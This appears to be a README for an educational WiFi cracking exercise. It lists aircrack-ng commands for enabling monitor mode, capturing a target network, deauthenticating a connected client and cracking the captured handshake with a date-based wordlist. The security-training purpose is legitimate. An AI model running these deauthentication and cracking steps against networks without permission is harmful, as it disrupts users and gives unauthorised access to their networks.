# WiFi Crack Exercise

This document outlines the process for conducting a WiFi cracking exercise, designed for educational purposes to understand network security and the importance of using strong, secure WiFi passwords. 

## Disclaimer

This exercise is intended for educational purposes only. Performing network attacks without explicit permission is illegal and unethical. Use this information responsibly and always with permission from the network owner.

## Prerequisites

- A wireless network adapter that supports monitor mode and packet injection.
- Kali Linux or any Linux distribution with the necessary tools installed (aircrack-ng suite, iwconfig).

## Steps to Perform WiFi Cracking

1. **Prepare the Environment**:
    - Ensure your wireless adapter is connected and recognized by your system.
    - Use `iwconfig` to check if your wireless adapter is listed.

2. **Kill Conflicting Processes**:
    - Run `sudo airmon-ng check kill` to stop services that might interfere with the WiFi cracking process.

3. **Enable Monitor Mode**:
    - Start monitor mode on your wireless adapter with `sudo airmon-ng start <your_interface_name>`.

4. **Monitor WiFi Networks**:
    - Use `sudo airodump-ng <your_interface_name_in_monitor_mode>` to list all available WiFi networks.

5. **Target Specific Network**:
    - Target a specific network using `sudo airodump-ng --channel <channel> --bssid <BSSID> --write <output_file_name> <interface>`.

6. **Deauthenticate a Connected Client**:
    - Use `sudo aireplay-ng --deauth 5 -a <BSSID> -c <client_MAC> <interface>` to deauthenticate a client, forcing them to reconnect and capture the handshake.

7. **Crack WiFi Password**:
    - Use `aircrack-ng <.cap_file> -w <wordlist>` to attempt cracking the WiFi password with the captured handshake.

8. **Restart Network Manager** (if needed):
    - Once done, you may need to restart your network services using `sudo systemctl restart NetworkManager`.

## Wordlist

It's crucial to have a comprehensive wordlist for the password cracking process. This exercise uses `dates_1920_2024_wordlist.txt` as an example.

## Contribution

Contributions to improve this exercise or the documentation are welcome. Ensure you follow ethical guidelines and legal requirements when contributing.

## Conclusion

Understanding the vulnerabilities in WiFi networks is crucial for creating secure networks. This exercise provides hands-on experience with tools and techniques for WiFi security analysis.
